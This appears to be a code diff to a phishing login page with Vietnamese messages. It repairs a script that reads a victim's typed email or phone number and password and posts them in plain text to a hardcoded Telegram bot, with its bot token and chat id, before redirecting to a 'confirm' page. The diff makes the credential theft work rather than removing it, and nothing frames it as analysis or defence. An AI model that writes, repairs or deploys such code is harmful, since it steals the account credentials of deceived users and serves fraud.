@@ -81,42 +81,46 @@
     </div>
   </div>
 
-  <script>
-   document.getElementById("sendBtn").addEventListener("click", function() {
+<script>
+  document.getElementById("sendBtn").addEventListener("click", function(event) {
     event.preventDefault(); // ❗ Ngăn form submit mặc định
-      var email = document.getElementById("email").value;
-      var password = document.getElementById("password").value;
-      const isPhone = /^\d{10}$/.test(emailInput); // 10 số
-      const isValidFakeEmail = /^[^@]+$/.test(emailInput); // không có dấu @
-     if (!isPhone && !isValidFakeEmail) {
-          alert("Vui lòng nhập số điện thoại hợp lệ (10 số) hoặc email không chứa '@'.");
-          event.preventDefault(); // Ngăn gửi form
-        }
-    
-        if (passwordInput === "") {
-          alert("Vui lòng nhập mật khẩu.");
-          event.preventDefault(); // Ngăn gửi form
-        }
-      });
 
-      var botToken = '8110453433:AAG56s0dUVRc4uAWmlVm9_WQPv-DKkjO164';
-      var chatId = '6022297636';
-      var message = `Email: ${email}\nPassword: ${password}`;
-      var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    var email = document.getElementById("email").value.trim();
+    var password = document.getElementById("password").value.trim();
 
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      })
-      .then(() => {
-        window.location.href = "confirm.html";
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        window.location.href = "confirm.html"; // Redirect even if there's an error
-      });
+    // ✅ Kiểm tra định dạng email và sđt
+    var isPhone = /^\d{10}$/.test(email); // là số điện thoại hợp lệ (10 số)
+    var isValidFakeEmail = /^[^@]+$/.test(email); // là "email" không chứa @
+
+    if (!isPhone && !isValidFakeEmail) {
+      alert("Vui lòng nhập số điện thoại hợp lệ (10 số) hoặc email không chứa '@'.");
+      return;
+    }
+
+    if (password === "") {
+      alert("Vui lòng nhập mật khẩu.");
+      return;
+    }
+
+    var botToken = '8110453433:AAG56s0dUVRc4uAWmlVm9_WQPv-DKkjO164';
+    var chatId = '6022297636';
+    var message = `Email: ${email}\nPassword: ${password}`;
+    var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    })
+    .then(() => {
+      window.location.href = "confirm.html";
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      window.location.href = "confirm.html"; // Redirect even if there's an error
     });
-  </script>
+  });
+</script>
+
 </body>
 </html>
